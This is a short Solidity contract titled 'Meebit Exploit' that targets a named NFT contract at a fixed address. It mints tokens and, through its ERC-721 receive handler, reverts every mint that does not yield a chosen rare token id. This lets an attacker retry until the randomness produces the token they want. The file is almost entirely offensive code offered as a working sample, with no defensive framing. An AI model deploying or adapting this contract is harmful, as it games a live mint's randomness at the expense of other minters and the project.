// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

// ============ Interfaces ============

// Meebit (extracted from ABI in shipped VueJS)
interface Meebit {
  // Public Meebit mint
  function mint() external payable returns (uint256);
  // Cost to mint Meebit
  function getPrice() external view returns (uint);
}

/**
 * @title Meebit Exploit
 * @dev Sample exploit for minting specific Meebit ids
 */
contract MeebitExploit {
  // ============ Private constants ============

  // Meebit contract
  Meebit private meebitContract = Meebit(0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7);

  // ============ Functions ============

  /**
   * Claims a meebit from the contract, paying mint cost
   */
  function claimRareMeebit() external {
    meebitContract.mint{value: meebitContract.getPrice()}();
  }

  /**
   * Handler on NFT receive, revert if not specific Meebit id
   */
  function onERC721Received(
    address operator, 
    address from, 
    uint256 tokenId, 
    bytes calldata data
  ) external returns (bytes4) {
    // Require receiving NFT == meebit
    require(from == 0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7, "Not a Meebit");
    // Revert if not a rare meebit
    require(tokenId == 1234, "Not a rare Meebit");

    // After this stage, process transfer of rare meebit to exploiter address

    return 0x150b7a02;
  }
}